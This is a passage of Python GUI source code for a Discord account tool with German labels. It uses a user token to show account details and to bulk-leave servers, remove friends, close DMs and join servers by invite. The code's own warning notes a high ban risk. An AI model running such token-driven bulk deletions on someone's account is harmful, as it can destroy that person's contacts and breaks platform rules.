        dc_top.pack(fill="x", padx=20, pady=16, side="top")

        lbl_dc_title = ctk.CTkLabel(dc_top, text="Account Matrix & Details", font=("Segoe UI", 13, "bold"), text_color=C["text"])
        lbl_dc_title.pack(side="left")

        pill_box = ctk.CTkFrame(dc_top, fg_color=C["card_alt"], corner_radius=12)
        pill_box.pack(side="right")

        for p_name in ["Uebersicht", "Sicherheit", "Token"]:
            p_lbl = ctk.CTkLabel(pill_box, text=p_name, font=("Segoe UI", 10, "bold"), text_color=C["text_sub"], padx=10, pady=4)
            p_lbl.pack(side="left")

        rows = [
            ("E-Mail Adresse:", u.get("email") or "- (Nicht oeffentlich)", "Verifiziert" if ver else "Nein"),
            ("Telefonnummer:", u.get("phone") or "- (Keine hinterlegt)", "Aktiv" if u.get("phone") else "-"),
            ("Sprache & Region:", f"{u.get('locale', 'de').upper()} (Discord)", "DE"),
            ("2FA Authenticator:", "Aktiviert (MFA)" if mfa else "Deaktiviert", "2FA"),
            ("Erstellungsdatum:", f"{dt_str} ({age_str})", f"{days_num} Tage"),
            ("Verbundene Server:", f"{len(self.guilds_data)} Server ({owned_guilds} Inhaber)", f"{len(self.guilds_data)} Total"),
            ("Freunde & Gruppen:", f"{len(self.friends_data)} Kontakte synchronisiert", f"{len(self.friends_data)} Total")
        ]

        dc_content = ctk.CTkFrame(detail_card, fg_color="transparent")
        dc_content.pack(fill="x", padx=20, pady=(0, 18))

        for lbl, val, tag in rows:
            r_box = ctk.CTkFrame(dc_content, fg_color=C["card_alt"], corner_radius=12, height=38)
            r_box.pack(fill="x", pady=3)
            r_box.pack_propagate(False)

            ctk.CTkLabel(r_box, text=lbl, font=("Segoe UI", 11, "bold"), text_color=C["text_muted"]).pack(side="left", padx=14)
            ctk.CTkLabel(r_box, text=val, font=("Segoe UI", 11), text_color=C["text"]).pack(side="left", padx=6)
            ctk.CTkLabel(r_box, text=tag, font=("Segoe UI", 9.5, "bold"), text_color=C["text_sub"], fg_color=C["card"], corner_radius=8, padx=10, pady=2).pack(side="right", padx=12)

    def _populate_accent_card(self, parent, subtitle, main_val, footer_txt, accent_color, small=False, action_btn=None):
        p_inner = ctk.CTkFrame(parent, fg_color="transparent")
        p_inner.pack(fill="both", expand=True, padx=16, pady=14 if not small else 12)

        top_row = ctk.CTkFrame(p_inner, fg_color="transparent")
        top_row.pack(fill="x")

        ctk.CTkLabel(top_row, text=subtitle, font=("Segoe UI", 9.5, "bold"), text_color=accent_color).pack(side="left")

        ctk.CTkLabel(p_inner, text=main_val, font=("Segoe UI", 18 if not small else 14, "bold"), text_color=C["text"]).pack(anchor="w", pady=(4, 2))
        ctk.CTkLabel(p_inner, text=footer_txt, font=("Segoe UI", 9.5), text_color=C["text_sub"]).pack(anchor="w")

        if action_btn:
            b_text, b_cmd, b_border, b_color = action_btn
            btn = ctk.CTkButton(
                p_inner,
                text=b_text,
                font=("Segoe UI", 9.5, "bold"),
                fg_color="transparent",
                hover_color=C["card_hover"],
                border_color=b_border,
                border_width=1,
                text_color=b_color,
                height=26,
                corner_radius=8,
                command=b_cmd
            )
            btn.pack(anchor="w", pady=(8, 0))

    # --------------------------------------------------------------------------
    # 3. SERVER TAB
    # --------------------------------------------------------------------------
    def _build_guilds_tab(self):
        top_bar = ctk.CTkFrame(self.frame_guilds, fg_color=C["card"], corner_radius=16, border_width=1, border_color=C["card_border"])
        top_bar.pack(fill="x", pady=(0, 10))

        tb_row1 = ctk.CTkFrame(top_bar, fg_color="transparent")
        tb_row1.pack(fill="x", padx=16, pady=(12, 6))

        title_box = ctk.CTkFrame(tb_row1, fg_color="transparent")
        title_box.pack(side="left")

        self.lbl_guilds_title = ctk.CTkLabel(
            title_box,
            text=f"Verbundene Server ({len(self.guilds_data)})",
            font=("Segoe UI", 15, "bold"),
            text_color=C["text"]
        )
        self.lbl_guilds_title.pack(side="left")

        self.lbl_selected_count = ctk.CTkLabel(
            title_box,
            text="(0 ausgewaehlt)",
            font=("Segoe UI", 10.5),
            text_color=C["text_muted"]
        )
        self.lbl_selected_count.pack(side="left", padx=(10, 0))

        self.guild_search_var = ctk.StringVar()
        self.guild_search_var.trace_add("write", lambda *args: self._filter_guilds())

        search_entry = ctk.CTkEntry(
            tb_row1,
            textvariable=self.guild_search_var,
            placeholder_text="Server nach Name oder ID filtern...",
            width=260,
            height=32,
            corner_radius=10,
            fg_color=C["card_alt"],
            border_color=C["card_border"],
            text_color=C["text"]
        )
        search_entry.pack(side="right", padx=(10, 0))

        btn_refresh = ctk.CTkButton(
            tb_row1,
            text="Aktualisieren",
            font=("Segoe UI", 10.5, "bold"),
            fg_color=C["btn_gray"],
            hover_color=C["btn_gray_hover"],
            border_color=C["btn_gray_border"],
            border_width=1,
            corner_radius=10,
            height=32,
            width=100,
            command=self._refresh_guilds_data
        )
        btn_refresh.pack(side="right")

        tb_row2 = ctk.CTkFrame(top_bar, fg_color="transparent")
        tb_row2.pack(fill="x", padx=16, pady=(4, 12))

        sel_box = ctk.CTkFrame(tb_row2, fg_color="transparent")
        sel_box.pack(side="left")

        btn_sel_all = ctk.CTkButton(
            sel_box,
            text="Alle markieren",
            font=("Segoe UI", 9.5, "bold"),
            fg_color=C["btn_gray"],
            hover_color=C["btn_gray_hover"],
            border_color=C["btn_gray_border"],
            border_width=1,
            corner_radius=8,
            height=28,
            width=105,
            command=self._select_all_guilds
        )
        btn_sel_all.pack(side="left", padx=(0, 6))

        btn_sel_none = ctk.CTkButton(
            sel_box,
            text="Keine",
            font=("Segoe UI", 9.5, "bold"),
            fg_color=C["btn_gray"],
            hover_color=C["btn_gray_hover"],
            border_color=C["btn_gray_border"],
            border_width=1,
            corner_radius=8,
            height=28,
            width=60,
            command=self._deselect_all_guilds
        )
        btn_sel_none.pack(side="left")

        act_box = ctk.CTkFrame(tb_row2, fg_color="transparent")
        act_box.pack(side="right")

        self.btn_stop_leave = ctk.CTkButton(
            act_box,
            text="Stop",
            font=("Segoe UI", 10, "bold"),
            fg_color=C["btn_gray"],
            text_color=C["text_muted"],
            hover_color=C["red_hover"],
            border_color=C["btn_gray_border"],
            border_width=1,
            corner_radius=8,
            height=28,
            width=65,
            state="disabled",
            command=self._stop_batch_leave
        )
        self.btn_stop_leave.pack(side="right", padx=(8, 0))

        btn_leave_all = ctk.CTkButton(
            act_box,
            text="Alle Server verlassen",
            font=("Segoe UI", 10, "bold"),
            fg_color=C["red_bg"],
            text_color=C["red_text"],
            hover_color=C["red_hover"],
            border_color=C["red_border"],
            border_width=1,
            corner_radius=8,
            height=28,
            command=self._leave_all_guilds
        )
        btn_leave_all.pack(side="right", padx=(8, 0))

        self.btn_leave_selected = ctk.CTkButton(
            act_box,
            text="Ausgewaehlte verlassen (0)",
            font=("Segoe UI", 10, "bold"),
            fg_color=C["red_bg"],
            text_color=C["red_text"],
            hover_color=C["red_hover"],
            border_color=C["red_border"],
            border_width=1,
            corner_radius=8,
            height=28,
            command=self._leave_selected_guilds
        )
        self.btn_leave_selected.pack(side="right")

        self.guilds_scroll = ctk.CTkScrollableFrame(self.frame_guilds, fg_color="transparent")
        self.guilds_scroll.pack(fill="both", expand=True)

        self._render_all_guilds_cards()

    def _render_all_guilds_cards(self):
        for widget in self.guilds_scroll.winfo_children():
            widget.destroy()

        self.guild_cards.clear()
        self.guild_checkboxes.clear()

        if not self.guilds_data:
            empty_box = ctk.CTkFrame(self.guilds_scroll, fg_color=C["card"], corner_radius=14, border_width=1, border_color=C["card_border"])
            empty_box.pack(fill="x", pady=20)
            ctk.CTkLabel(empty_box, text="Keine Server vorhanden.", font=("Segoe UI", 12), text_color=C["text_muted"]).pack(pady=24)
            return

        for g in self.guilds_data:
            gid = str(g.get("id", "0"))
            gname = g.get("name", "Unbekannter Server")
            is_owner = g.get("owner", False)

            card = ctk.CTkFrame(self.guilds_scroll, fg_color=C["card"], corner_radius=14, border_width=1, border_color=C["card_border"])
            card.pack(fill="x", pady=3)
            self.guild_cards[gid] = card

            ci = ctk.CTkFrame(card, fg_color="transparent")
            ci.pack(fill="x", padx=16, pady=8)

            if not is_owner:
                chk_var = ctk.BooleanVar(value=False)
                self.guild_checkboxes[gid] = chk_var
                chk = ctk.CTkCheckBox(
                    ci,
                    text="",
                    variable=chk_var,
                    width=22,
                    checkbox_width=18,
                    checkbox_height=18,
                    corner_radius=4,
                    border_width=1.5,
                    border_color=C["card_border_hi"],
                    fg_color=C["blurple"],
                    hover_color=C["blurple_hi"],
                    command=self._update_selected_count
                )
                chk.pack(side="left", padx=(0, 8))
            else:
                spacer = ctk.CTkFrame(ci, width=22, height=18, fg_color="transparent")
                spacer.pack(side="left", padx=(0, 8))

            g_initial = (gname[:1] or "S").upper()
            icon_badge = ctk.CTkLabel(ci, text=g_initial, font=("Segoe UI", 12, "bold"), text_color=C["text_sub"], width=36, height=36, fg_color=C["card_alt"], corner_radius=18)
            icon_badge.pack(side="left", padx=(0, 12))

            title_col = ctk.CTkFrame(ci, fg_color="transparent")
            title_col.pack(side="left", fill="x", expand=True)

            ctk.CTkLabel(title_col, text=gname, font=("Segoe UI", 12, "bold"), text_color=C["text"]).pack(anchor="w")
            ctk.CTkLabel(title_col, text=f"ID: {gid}", font=("Consolas", 9.5), text_color=C["text_muted"]).pack(anchor="w")

            if is_owner:
                badge = ctk.CTkLabel(ci, text="Inhaber", font=("Segoe UI", 9.5, "bold"), fg_color=C["acc_yellow_bg"], text_color=C["acc_yellow_text"], corner_radius=8, padx=10, pady=4)
                badge.pack(side="right", padx=(10, 0))
            else:
                badge = ctk.CTkLabel(ci, text="Mitglied", font=("Segoe UI", 9.5, "bold"), fg_color=C["card_alt"], text_color=C["text_sub"], corner_radius=8, padx=10, pady=4)
                badge.pack(side="right", padx=(10, 0))

                btn_leave = ctk.CTkButton(
                    ci,
                    text="Verlassen",
                    font=("Segoe UI", 10.5, "bold"),
                    fg_color=C["red_bg"],
                    text_color=C["red_text"],
                    hover_color=C["red_hover"],
                    border_color=C["red_border"],
                    border_width=1,
                    height=30,
                    corner_radius=8,
                    command=lambda i=gid, n=gname: self._leave_guild_direct(i, n)
                )
                btn_leave.pack(side="right", padx=(10, 0))

        self._update_selected_count()

    def _update_selected_count(self):
        cnt = sum(1 for var in self.guild_checkboxes.values() if var.get())
        if hasattr(self, "lbl_selected_count"):
            self.lbl_selected_count.configure(text=f"({cnt} ausgewaehlt)")
        if hasattr(self, "btn_leave_selected"):
            self.btn_leave_selected.configure(text=f"Ausgewaehlte verlassen ({cnt})")

    def _select_all_guilds(self):
        for var in self.guild_checkboxes.values():
            var.set(True)
        self._update_selected_count()

    def _deselect_all_guilds(self):
        for var in self.guild_checkboxes.values():
            var.set(False)
        self._update_selected_count()

    def _filter_guilds(self):
        query = self.guild_search_var.get().strip().lower()
        for g in self.guilds_data:
            gid = str(g.get("id", "0"))
            card = self.guild_cards.get(gid)
            if not card:
                continue
            gname = str(g.get("name", "")).lower()
            matches = not query or (query in gname or query in gid)
            if matches:
                if not card.winfo_ismapped():
                    card.pack(fill="x", pady=3)
            else:
                if card.winfo_ismapped():
                    card.pack_forget()

    def _remove_single_guild_ui(self, guild_id):
        gid_str = str(guild_id)
        card = self.guild_cards.pop(gid_str, None)
        self.guild_checkboxes.pop(gid_str, None)
        if card:
            try: card.destroy()
            except Exception: pass
        self.guilds_data = [g for g in self.guilds_data if str(g.get("id")) != gid_str]
        self.nav_btns["guilds"].configure(text=f"Server ({len(self.guilds_data)})")
        self.lbl_guilds_title.configure(text=f"Verbundene Server ({len(self.guilds_data)})")
        self._update_selected_count()
        self._update_extra_guild_options()

    def _leave_guild_direct(self, guild_id, guild_name):
        self._remove_single_guild_ui(guild_id)
        def _do_leave():
            if not self.token or self.token.startswith("mfa.VkO_") or "DEMO" in self.token:
                return
            make_discord_api_request("DELETE", f"https://discord.com/api/v10/users/@me/guilds/{guild_id}", self.token)
        threading.Thread(target=_do_leave, daemon=True).start()

    def _leave_selected_guilds(self):
        selected_ids = [gid for gid, var in self.guild_checkboxes.items() if var.get()]
        if not selected_ids:
            return
        self._batch_leave_guilds(selected_ids)

    def _leave_all_guilds(self):
        all_member_ids = [str(g.get("id")) for g in self.guilds_data if not g.get("owner")]
        if not all_member_ids:
            return
        self._batch_leave_guilds(all_member_ids)

    def _stop_batch_leave(self):
        self.stop_requested = True
        if hasattr(self, "btn_stop_leave"):
            self.btn_stop_leave.configure(text="Stoppe...", state="disabled")

    def _batch_leave_guilds(self, guild_ids):
        if self.leave_in_progress or not guild_ids:
            return

        self.leave_in_progress = True
        self.stop_requested = False

        if hasattr(self, "btn_stop_leave"):
            self.btn_stop_leave.configure(
                state="normal",
                fg_color=C["red_bg"],
                text_color=C["red_text"],
                border_color=C["red_border"],
                hover_color=C["red_hover"],
                text="Stop"
            )

        def _worker():
            for gid in list(guild_ids):
                if self.stop_requested:
                    break

                self.after(0, lambda target=gid: self._remove_single_guild_ui(target))

                if self.token and not self.token.startswith("mfa.VkO_") and "DEMO" not in self.token:
                    make_discord_api_request("DELETE", f"https://discord.com/api/v10/users/@me/guilds/{gid}", self.token)
                    for _ in range(5):
                        if self.stop_requested:
                            break
                        time.sleep(0.04)
                else:
                    time.sleep(0.04)

            self.leave_in_progress = False
            self.stop_requested = False
            self.after(0, lambda: self._on_batch_leave_finished())

        threading.Thread(target=_worker, daemon=True).start()

    def _on_batch_leave_finished(self):
        if hasattr(self, "btn_stop_leave"):
            self.btn_stop_leave.configure(
                state="disabled",
                fg_color=C["btn_gray"],
                text_color=C["text_muted"],
                border_color=C["btn_gray_border"],
                text="Stop"
            )

    def _refresh_guilds_data(self):
        if not self.token or "DEMO" in self.token:
            self._render_all_guilds_cards()
            return

        def _fetch():
            try:
                rg = make_discord_api_request("GET", "https://discord.com/api/v10/users/@me/guilds", self.token)
                if rg and rg.status_code == 200:
                    self.guilds_data = rg.json()
                    self.after(0, lambda: [
                        self.nav_btns["guilds"].configure(text=f"Server ({len(self.guilds_data)})"),
                        self.lbl_guilds_title.configure(text=f"Verbundene Server ({len(self.guilds_data)})"),
                        self._render_all_guilds_cards(),
                        self._update_extra_guild_options()
                    ])
            except Exception:
                pass

        threading.Thread(target=_fetch, daemon=True).start()

    # --------------------------------------------------------------------------
    # 4. FREUNDE & GRUPPEN TAB (INCL. CHATS SCHLIESSEN)
    # --------------------------------------------------------------------------
    def _build_friends_tab(self):
        top_bar = ctk.CTkFrame(self.frame_friends, fg_color=C["card"], corner_radius=16, border_width=1, border_color=C["card_border"])
        top_bar.pack(fill="x", pady=(0, 10))

        tb_row1 = ctk.CTkFrame(top_bar, fg_color="transparent")
        tb_row1.pack(fill="x", padx=16, pady=(12, 6))

        title_box = ctk.CTkFrame(tb_row1, fg_color="transparent")
        title_box.pack(side="left")

        self.lbl_friends_title = ctk.CTkLabel(
            title_box,
            text=f"Freunde & Gruppen ({len(self.friends_data)})",
            font=("Segoe UI", 15, "bold"),
            text_color=C["text"]
        )
        self.lbl_friends_title.pack(side="left")

        self.lbl_friends_selected_count = ctk.CTkLabel(
            title_box,
            text="(0 ausgewaehlt)",
            font=("Segoe UI", 10.5),
            text_color=C["text_muted"]
        )
        self.lbl_friends_selected_count.pack(side="left", padx=(10, 0))

        self.friends_search_var = ctk.StringVar()
        self.friends_search_var.trace_add("write", lambda *args: self._filter_friends())

        search_entry = ctk.CTkEntry(
            tb_row1,
            textvariable=self.friends_search_var,
            placeholder_text="Freunde oder Gruppen filtern...",
            width=260,
            height=32,
            corner_radius=10,
            fg_color=C["card_alt"],
            border_color=C["card_border"],
            text_color=C["text"]
        )
        search_entry.pack(side="right", padx=(10, 0))

        btn_refresh = ctk.CTkButton(
            tb_row1,
            text="Aktualisieren",
            font=("Segoe UI", 10.5, "bold"),
            fg_color=C["btn_gray"],
            hover_color=C["btn_gray_hover"],
            border_color=C["btn_gray_border"],
            border_width=1,
            corner_radius=10,
            height=32,
            width=100,
            command=self._refresh_friends_data
        )
        btn_refresh.pack(side="right")

        tb_row2 = ctk.CTkFrame(top_bar, fg_color="transparent")
        tb_row2.pack(fill="x", padx=16, pady=(4, 12))

        sel_box = ctk.CTkFrame(tb_row2, fg_color="transparent")
        sel_box.pack(side="left")

        btn_sel_all = ctk.CTkButton(
            sel_box,
            text="Alle markieren",
            font=("Segoe UI", 9.5, "bold"),
            fg_color=C["btn_gray"],
            hover_color=C["btn_gray_hover"],
            border_color=C["btn_gray_border"],
            border_width=1,
            corner_radius=8,
            height=28,
            width=105,
            command=self._select_all_friends
        )
        btn_sel_all.pack(side="left", padx=(0, 6))

        btn_sel_none = ctk.CTkButton(
            sel_box,
            text="Keine",
            font=("Segoe UI", 9.5, "bold"),
            fg_color=C["btn_gray"],
            hover_color=C["btn_gray_hover"],
            border_color=C["btn_gray_border"],
            border_width=1,
            corner_radius=8,
            height=28,
            width=60,
            command=self._deselect_all_friends
        )
        btn_sel_none.pack(side="left")

        act_box = ctk.CTkFrame(tb_row2, fg_color="transparent")
        act_box.pack(side="right")

        self.btn_stop_friends = ctk.CTkButton(
            act_box,
            text="Stop",
            font=("Segoe UI", 10, "bold"),
            fg_color=C["btn_gray"],
            text_color=C["text_muted"],
            hover_color=C["red_hover"],
            border_color=C["btn_gray_border"],
            border_width=1,
            corner_radius=8,
            height=28,
            width=65,
            state="disabled",
            command=self._stop_batch_friends
        )
        self.btn_stop_friends.pack(side="right", padx=(8, 0))

        btn_remove_all = ctk.CTkButton(
            act_box,
            text="Alle Freunde entfernen",
            font=("Segoe UI", 10, "bold"),
            fg_color=C["red_bg"],
            text_color=C["red_text"],
            hover_color=C["red_hover"],
            border_color=C["red_border"],
            border_width=1,
            corner_radius=8,
            height=28,
            command=self._remove_all_friends
        )
        btn_remove_all.pack(side="right", padx=(8, 0))

        self.btn_remove_selected = ctk.CTkButton(
            act_box,
            text="Ausgewaehlte entfernen (0)",
            font=("Segoe UI", 10, "bold"),
            fg_color=C["red_bg"],
            text_color=C["red_text"],
            hover_color=C["red_hover"],
            border_color=C["red_border"],
            border_width=1,
            corner_radius=8,
            height=28,
            command=self._remove_selected_friends
        )
        self.btn_remove_selected.pack(side="right")

        self.friends_scroll = ctk.CTkScrollableFrame(self.frame_friends, fg_color="transparent")
        self.friends_scroll.pack(fill="both", expand=True)

        self._render_all_friends_cards()

    def _render_all_friends_cards(self):
        for widget in self.friends_scroll.winfo_children():
            widget.destroy()

        self.friend_cards.clear()
        self.friend_checkboxes.clear()

        if not self.friends_data:
            empty_box = ctk.CTkFrame(self.friends_scroll, fg_color=C["card"], corner_radius=14, border_width=1, border_color=C["card_border"])
            empty_box.pack(fill="x", pady=20)
            ctk.CTkLabel(empty_box, text="Keine Freunde oder Gruppen vorhanden.", font=("Segoe UI", 12), text_color=C["text_muted"]).pack(pady=24)
            return

        for item in self.friends_data:
            fid = str(item.get("id", "0"))
            fname = item.get("name", "Unbekannt")
            sub_info = item.get("username", "")
            type_lbl = item.get("type_name", "Freund")
            is_group = item.get("is_group", False)
            tag = "GR" if is_group else ("DM" if type_lbl == "DM" else "FR")

            card = ctk.CTkFrame(self.friends_scroll, fg_color=C["card"], corner_radius=14, border_width=1, border_color=C["card_border"])
            card.pack(fill="x", pady=3)
            self.friend_cards[fid] = card

            ci = ctk.CTkFrame(card, fg_color="transparent")
            ci.pack(fill="x", padx=16, pady=8)

            chk_var = ctk.BooleanVar(value=False)
            self.friend_checkboxes[fid] = chk_var
            chk = ctk.CTkCheckBox(
                ci,
                text="",
                variable=chk_var,
                width=22,
                checkbox_width=18,
                checkbox_height=18,
                corner_radius=4,
                border_width=1.5,
                border_color=C["card_border_hi"],
                fg_color=C["blurple"],
                hover_color=C["blurple_hi"],
                command=self._update_selected_friends_count
            )
            chk.pack(side="left", padx=(0, 8))

            icon_badge = ctk.CTkLabel(ci, text=tag, font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=36, height=36, fg_color=C["card_alt"], corner_radius=18)
            icon_badge.pack(side="left", padx=(0, 12))

            title_col = ctk.CTkFrame(ci, fg_color="transparent")
            title_col.pack(side="left", fill="x", expand=True)

            ctk.CTkLabel(title_col, text=fname, font=("Segoe UI", 12, "bold"), text_color=C["text"]).pack(anchor="w")
            ctk.CTkLabel(title_col, text=f"{sub_info}  |  ID: {fid}", font=("Consolas", 9.5), text_color=C["text_muted"]).pack(anchor="w")

            badge = ctk.CTkLabel(
                ci,
                text=type_lbl,
                font=("Segoe UI", 9.5, "bold"),
                fg_color=C["card_alt"],
                text_color=C["text_sub"],
                corner_radius=8,
                padx=10,
                pady=4
            )
            badge.pack(side="right", padx=(10, 0))

            btn_rem = ctk.CTkButton(
                ci,
                text="Verlassen" if is_group else "Entfernen",
                font=("Segoe UI", 10.5, "bold"),
                fg_color=C["red_bg"],
                text_color=C["red_text"],
                hover_color=C["red_hover"],
                border_color=C["red_border"],
                border_width=1,
                height=30,
                corner_radius=8,
                command=lambda i=fid, g=is_group: self._remove_friend_direct(i, g)
            )
            btn_rem.pack(side="right", padx=(10, 0))

        self._update_selected_friends_count()

    def _update_selected_friends_count(self):
        cnt = sum(1 for var in self.friend_checkboxes.values() if var.get())
        if hasattr(self, "lbl_friends_selected_count"):
            self.lbl_friends_selected_count.configure(text=f"({cnt} ausgewaehlt)")
        if hasattr(self, "btn_remove_selected"):
            self.btn_remove_selected.configure(text=f"Ausgewaehlte entfernen ({cnt})")

    def _select_all_friends(self):
        for var in self.friend_checkboxes.values():
            var.set(True)
        self._update_selected_friends_count()

    def _deselect_all_friends(self):
        for var in self.friend_checkboxes.values():
            var.set(False)
        self._update_selected_friends_count()

    def _filter_friends(self):
        query = self.friends_search_var.get().strip().lower()
        for f in self.friends_data:
            fid = str(f.get("id", "0"))
            card = self.friend_cards.get(fid)
            if not card:
                continue
            fname = str(f.get("name", "")).lower()
            fuser = str(f.get("username", "")).lower()
            matches = not query or (query in fname or query in fuser or query in fid)
            if matches:
                if not card.winfo_ismapped():
                    card.pack(fill="x", pady=3)
            else:
                if card.winfo_ismapped():
                    card.pack_forget()

    def _remove_single_friend_ui(self, item_id):
        fid_str = str(item_id)
        card = self.friend_cards.pop(fid_str, None)
        self.friend_checkboxes.pop(fid_str, None)
        if card:
            try: card.destroy()
            except Exception: pass
        self.friends_data = [f for f in self.friends_data if str(f.get("id")) != fid_str]
        self.nav_btns["friends"].configure(text=f"Freunde & Gruppen ({len(self.friends_data)})")
        self.lbl_friends_title.configure(text=f"Freunde & Gruppen ({len(self.friends_data)})")
        self._update_selected_friends_count()

    def _remove_friend_direct(self, item_id, is_group):
        self._remove_single_friend_ui(item_id)
        def _do_remove():
            if not self.token or self.token.startswith("mfa.VkO_") or "DEMO" in self.token:
                return

            if is_group:
                make_discord_api_request("DELETE", f"https://discord.com/api/v10/channels/{item_id}", self.token)
            else:
                # 1. Freundschaft aufloesen
                make_discord_api_request("DELETE", f"https://discord.com/api/v10/users/@me/relationships/{item_id}", self.token)

                # 2. Chat (DM Channel) schliessen
                dm_cid = self.user_to_channel_map.get(str(item_id))
                if not dm_cid:
                    try:
                        res_open = make_discord_api_request("POST", "https://discord.com/api/v10/users/@me/channels", self.token, json_data={"recipient_id": str(item_id)})
                        if res_open and res_open.status_code in (200, 201):
                            dm_cid = res_open.json().get("id")
                            if dm_cid:
                                self.user_to_channel_map[str(item_id)] = str(dm_cid)
                    except Exception:
                        pass

                if dm_cid:
                    make_discord_api_request("DELETE", f"https://discord.com/api/v10/channels/{dm_cid}", self.token)

        threading.Thread(target=_do_remove, daemon=True).start()

    def _remove_selected_friends(self):
        selected_ids = [fid for fid, var in self.friend_checkboxes.items() if var.get()]
        if not selected_ids:
            return
        self._batch_remove_friends(selected_ids)

    def _remove_all_friends(self):
        all_ids = [str(f.get("id")) for f in self.friends_data]
        if not all_ids:
            return
        self._batch_remove_friends(all_ids)

    def _stop_batch_friends(self):
        self.friend_stop_requested = True
        if hasattr(self, "btn_stop_friends"):
            self.btn_stop_friends.configure(text="Stoppe...", state="disabled")

    def _batch_remove_friends(self, ids_list):
        if self.friend_leave_in_progress or not ids_list:
            return

        self.friend_leave_in_progress = True
        self.friend_stop_requested = False

        if hasattr(self, "btn_stop_friends"):
            self.btn_stop_friends.configure(
                state="normal",
                fg_color=C["red_bg"],
                text_color=C["red_text"],
                border_color=C["red_border"],
                hover_color=C["red_hover"],
                text="Stop"
            )

        def _worker():
            type_map = {str(f.get("id")): f.get("is_group", False) for f in self.friends_data}

            for fid in list(ids_list):
                if self.friend_stop_requested:
                    break

                is_group = type_map.get(str(fid), False)
                self.after(0, lambda target=fid: self._remove_single_friend_ui(target))

                if self.token and not self.token.startswith("mfa.VkO_") and "DEMO" not in self.token:
                    if is_group:
                        make_discord_api_request("DELETE", f"https://discord.com/api/v10/channels/{fid}", self.token)
                    else:
                        make_discord_api_request("DELETE", f"https://discord.com/api/v10/users/@me/relationships/{fid}", self.token)
                        dm_cid = self.user_to_channel_map.get(str(fid))
                        if not dm_cid:
                            res_open = make_discord_api_request("POST", "https://discord.com/api/v10/users/@me/channels", self.token, json_data={"recipient_id": str(fid)})
                            if res_open and res_open.status_code in (200, 201):
                                dm_cid = res_open.json().get("id")
                                if dm_cid:
                                    self.user_to_channel_map[str(fid)] = str(dm_cid)
                        if dm_cid:
                            make_discord_api_request("DELETE", f"https://discord.com/api/v10/channels/{dm_cid}", self.token)

                    for _ in range(5):
                        if self.friend_stop_requested:
                            break
                        time.sleep(0.04)
                else:
                    time.sleep(0.04)

            self.friend_leave_in_progress = False
            self.friend_stop_requested = False
            self.after(0, lambda: self._on_batch_friends_finished())

        threading.Thread(target=_worker, daemon=True).start()

    def _on_batch_friends_finished(self):
        if hasattr(self, "btn_stop_friends"):
            self.btn_stop_friends.configure(
                state="disabled",
                fg_color=C["btn_gray"],
                text_color=C["text_muted"],
                border_color=C["btn_gray_border"],
                text="Stop"
            )

    def _refresh_friends_data(self):
        if not self.token or "DEMO" in self.token:
            self._render_all_friends_cards()
            return

        def _fetch():
            try:
                fresh = []
                rf = make_discord_api_request("GET", "https://discord.com/api/v10/users/@me/relationships", self.token)
                if rf and rf.status_code == 200:
                    for r in rf.json():
                        u_info = r.get("user", {})
                        fresh.append({
                            "id": str(r.get("id", u_info.get("id"))),
                            "name": u_info.get("global_name") or u_info.get("username", "Freund"),
                            "username": u_info.get("username", ""),
                            "type_name": "Freund" if r.get("type") == 1 else ("Anfrage" if r.get("type") in (3, 4) else "Blockiert"),
                            "is_group": False
                        })
                rc = make_discord_api_request("GET", "https://discord.com/api/v10/users/@me/channels", self.token)
                if rc and rc.status_code == 200:
                    for ch in rc.json():
                        ch_type = ch.get("type")
                        recips = ch.get("recipients", [])
                        recip_names = ", ".join([rcp.get("username", "") for rcp in recips[:3]])
                        if ch_type == 3:
                            g_name = ch.get("name") or (f"Gruppe ({recip_names})" if recip_names else "Gruppe")
                            fresh.append({
                                "id": str(ch.get("id")),
                                "name": g_name,
                                "username": f"{len(recips)} Mitglieder",
                                "type_name": "Gruppe",
                                "is_group": True
                            })
                        elif ch_type == 1 and recips:
                            dm_uid = str(recips[0].get("id"))
                            self.user_to_channel_map[dm_uid] = str(ch.get("id"))
                            if not any(f["id"] == dm_uid for f in fresh):
                                fresh.append({
                                    "id": str(ch.get("id")),
                                    "name": recips[0].get("global_name") or recips[0].get("username", "DM"),
                                    "username": recips[0].get("username", ""),
                                    "type_name": "DM",
                                    "is_group": True
                                })
                self.friends_data = fresh
                self.after(0, lambda: [
                    self.nav_btns["friends"].configure(text=f"Freunde & Gruppen ({len(self.friends_data)})"),
                    self.lbl_friends_title.configure(text=f"Freunde & Gruppen ({len(self.friends_data)})"),
                    self._render_all_friends_cards(),
                    self._populate_quick_targets()
                ])
            except Exception:
                pass

        threading.Thread(target=_fetch, daemon=True).start()

    # --------------------------------------------------------------------------
    # 5. SERVER BEITRETEN TAB (Per Link oder Code)
    # --------------------------------------------------------------------------
    def _build_join_tab(self):
        container = ctk.CTkFrame(self.frame_join, fg_color="transparent")
        container.pack(fill="both", expand=True)

        card = ctk.CTkFrame(container, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
        card.pack(fill="x", pady=(0, 14))

        card_in = ctk.CTkFrame(card, fg_color="transparent")
        card_in.pack(fill="x", padx=24, pady=24)

        ctk.CTkLabel(card_in, text="Server beitreten per Einladungslink", font=("Segoe UI", 16, "bold"), text_color=C["text"]).pack(anchor="w")
        ctk.CTkLabel(card_in, text="Gib einen gueltigen Discord Einladungslink oder Invite-Code ein, um dem Server sofort beizutreten.", font=("Segoe UI", 11), text_color=C["text_muted"]).pack(anchor="w", pady=(3, 10))

        # Kleine Warnbox
        box_warn_join = ctk.CTkFrame(card_in, fg_color=C["red_bg"], corner_radius=8, border_width=1, border_color=C["red_border"])
        box_warn_join.pack(fill="x", pady=(0, 14))
        ctk.CTkLabel(
            box_warn_join,
            text="Warnung: Hohe Ban-Gefahr",
            font=("Segoe UI", 10.5, "bold"),
            text_color=C["red_text"]
        ).pack(anchor="w", padx=12, pady=5)

        input_row = ctk.CTkFrame(card_in, fg_color="transparent")
        input_row.pack(fill="x")

        self.join_input_var = ctk.StringVar()
        self.entry_join = ctk.CTkEntry(
            input_row,
            textvariable=self.join_input_var,
            placeholder_text="Invite-Code eingeben (z.B. gaming, anime)...",
            height=40,
            corner_radius=12,
            fg_color=C["card_alt"],
            border_color=C["card_border_hi"],
            text_color=C["text"]
        )
        self.entry_join.pack(side="left", fill="x", expand=True, padx=(0, 10))

        btn_join = ctk.CTkButton(
            input_row,
            text="Server beitreten",
            font=("Segoe UI", 11.5, "bold"),
            fg_color=C["btn_gray"],
            hover_color=C["btn_gray_hover"],
            border_color=C["card_border_hi"],
            border_width=1,
            height=40,
            width=160,
            corner_radius=12,
